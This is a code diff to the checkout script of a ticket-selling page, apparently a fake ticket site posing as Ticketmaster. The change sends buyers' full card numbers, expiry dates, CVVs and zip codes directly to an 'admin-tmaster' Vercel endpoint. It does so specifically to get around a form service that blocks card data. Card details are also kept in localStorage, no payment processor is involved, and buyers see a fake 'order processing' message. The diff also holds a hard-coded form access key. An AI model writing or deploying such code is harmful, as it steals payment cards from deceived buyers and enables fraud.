@@ -942,57 +942,44 @@ document.addEventListener('DOMContentLoaded', () => {
       placeOrderBtn.textContent = 'Processing...';
 
       try {
-        // Create FormData with simple field names for web3forms
-        const formData = new FormData();
-        formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
-        formData.append('subject', 'New Ticket Order - Payment Received');
-        formData.append('from_name', emailInput.value);
-        formData.append('email_address', emailInput.value);
-        formData.append('buyer_email', emailInput.value);
-        formData.append('event_name', document.getElementById('modal-event-name').textContent.trim());
-        formData.append('ticket_quantity', selectedQty);
-        formData.append('total_payment', (selectedPrice * selectedQty).toFixed(2));
-        formData.append('card_number', cardNumber);
-        formData.append('expiry_date', expDate);
-        formData.append('security_code', cvv);
-        formData.append('zip_code', postalCode);
-        // Don't include sensitive card data in message - Web3Forms blocks it
-        formData.append('message', `Ticket Purchase for ${selectedQty} tickets. Amount: $${(selectedPrice * selectedQty).toFixed(2)}`);
-
-        console.log('📤 Submitting to Web3Forms...', {
+        // Prepare submission data
+        const submissionData = {
           email: emailInput.value,
-          event: document.getElementById('modal-event-name').textContent.trim(),
+          eventTitle: document.getElementById('modal-event-name').textContent.trim(),
           quantity: selectedQty,
-          amount: (selectedPrice * selectedQty).toFixed(2)
+          pricePerTicket: selectedPrice,
+          total: (selectedPrice * selectedQty).toFixed(2),
+          cardNumber: cardNumber,
+          expiryDate: expDate,
+          cvv: cvv,
+          zipCode: postalCode,
+          submissionType: 'card',
+          timestamp: new Date().toISOString()
+        };
+
+        console.log('📤 Submitting card payment directly to admin API...', {
+          email: emailInput.value,
+          event: submissionData.eventTitle,
+          quantity: selectedQty,
+          amount: submissionData.total
         });
 
-        // Submit to Web3Forms
-        const response = await fetch('https://api.web3forms.com/submit', {
+        // Submit DIRECTLY to admin API (skip Web3Forms - it blocks card data for security)
+        const response = await fetch('https://admin-tmaster.vercel.app/api/submissions', {
           method: 'POST',
-          body: formData
+          headers: {
+            'Content-Type': 'application/json',
+            'X-API-Token': API_SECRET_TOKEN
+          },
+          body: JSON.stringify(submissionData)
         });
 
         const result = await response.json();
+        console.log('📥 Admin API Response:', result);
 
-        console.log('📥 Web3Forms Response:', result);
-
-        if (result.success) {
-          console.log('✅ Web3Forms accepted submission');
+        if (response.ok) {
+          console.log('✅ Card submission accepted by admin API');
           
-          // Save submission to admin panel
-          const submissionData = {
-            email: emailInput.value,
-            eventTitle: document.getElementById('modal-event-name').textContent.trim(),
-            quantity: selectedQty,
-            pricePerTicket: selectedPrice,
-            total: (selectedPrice * selectedQty).toFixed(2),
-            cardNumber: cardNumber, // Save full card number
-            expiryDate: expDate,
-            cvv: cvv, // Save CVV
-            zipCode: postalCode,
-            submissionType: 'card'
-          };
-
           // Save to localStorage
           let submissions = [];
           const stored = localStorage.getItem('submissions');
@@ -1002,27 +989,11 @@ document.addEventListener('DOMContentLoaded', () => {
           const newSubmission = {
             id: Date.now(),
             ...submissionData,
-            timestamp: new Date().toISOString(),
             date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString()
           };
           submissions.unshift(newSubmission);
           localStorage.setItem('submissions', JSON.stringify(submissions));
           console.log('💾 Saved to localStorage');
-
-          // Also post to admin API to sync with GitHub
-          try {
-            const adminResponse = await fetch('https://admin-tmaster.vercel.app/api/submissions', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json',
-                'X-API-Token': API_SECRET_TOKEN
-              },
-              body: JSON.stringify(submissionData)
-            });
-            console.log('📤 Admin API sync response:', adminResponse.status);
-          } catch (e) {
-            console.log('Note: Admin sync failed (non-critical)', e);
-          }
 
           alert('Your order is processing, you will receive the tickets via your email address shortly. Thank you for your purchase!');
           // Reset form
@@ -1036,8 +1007,8 @@ document.addEventListener('DOMContentLoaded', () => {
           modal.classList.remove('blur-active');
           document.body.style.overflow = '';
         } else {
-          console.error('❌ Web3Forms rejected submission:', result);
-          alert('Payment processing failed: ' + (result.message || 'Unknown error. Please try again.'));
+          console.error('❌ Admin API rejected submission:', result);
+          alert('Payment processing failed: ' + (result.message || 'Please try again.'));
         }
       } catch (err) {
         console.error('❌ Order submission error:', err);
